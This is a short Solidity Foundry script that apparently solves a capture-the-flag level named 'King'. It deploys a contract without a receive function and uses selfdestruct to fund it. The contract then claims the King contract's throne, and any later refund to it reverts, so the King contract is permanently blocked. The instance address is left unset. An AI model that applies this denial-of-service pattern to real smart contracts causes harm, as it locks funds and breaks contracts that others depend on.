pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {King} from "../src/King.sol";


contract Suicide
{
    constructor (address receiver) payable
    {
        selfdestruct(payable(receiver));
    }
}

// no fallback or receive
contract playerContract
{
    function send_ether(address _king, uint value) external
    {
        (bool success, ) = _king.call{value: value}("");
        require(success, "transfer to king contract failed");
    }
}

contract interact is Script
{

    function run() external
    {
        vm.startBroadcast();

        playerContract plContr = new playerContract();
        address kingAddr; // instance address

        King king = King(payable(kingAddr));
        uint currentPrize = king.prize();

        Suicide suicide = new Suicide{value: currentPrize}(address(plContr));
        plContr.send_ether(kingAddr, currentPrize);

        vm.stopBroadcast();
    }
}
